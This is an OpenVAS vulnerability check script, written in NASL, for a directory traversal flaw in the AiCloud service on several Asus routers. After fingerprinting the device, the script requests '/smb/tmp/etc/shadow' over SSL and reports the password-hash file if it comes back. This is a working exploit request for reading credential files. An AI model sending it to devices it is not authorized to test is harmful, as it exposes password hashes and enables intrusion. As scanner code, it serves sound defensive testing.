###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asus_rt_aicloud_dir_traversal_6_13.nasl 11 2013-10-27 10:12:02Z jan $
#
# Asus RT-N66U/RT-AC66R/RT-N65U Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Asus RT-N66U/RT-AC66R/RT-N65U are prone to a directory traversal
vulnerability. Exploitation could allow a remote attacker to obtain
sensitive information that could be used to mount further attacks.";


tag_solution = "Turn off AiCloud service.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103747";

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_name("Asus RT-N66U/RT-AC66R/RT-N65U Directory Traversal Vulnerability");
 script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/asus-rt-n66u-directory-traversal");
 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-06-26 13:46:49 +0200 (Wed, 26 Jun 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read /etc/shadow");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);

if(banner !~ 'Basic realm="(RT-N66U|RT-AC66R|RT-N65U)"')exit(0);

ssl_port = 443;
if(!get_port_state(ssl_port))exit(0);

soc = open_sock_tcp(ssl_port, transport:ENCAPS_SSLv23);
if(!soc)exit(0);

url = '/smb/tmp/etc/shadow';

req = http_get(item:url, port:ssl_port);
send(socket:soc, data:req);

while(buf = recv(socket:soc, length:2048)) {

  recv += buf;

}  

close(soc);

if(egrep(pattern:"nas:.*:0:[01]:.*:", string:recv)) {

  desc = desc + '\n\nBy requesting the URL "/smb/tmp/etc/shadow" we received the following response:\n\n' + recv + '\n';

  security_hole(port:ssl_port, data:desc);
  exit(0);

}  

exit(99);
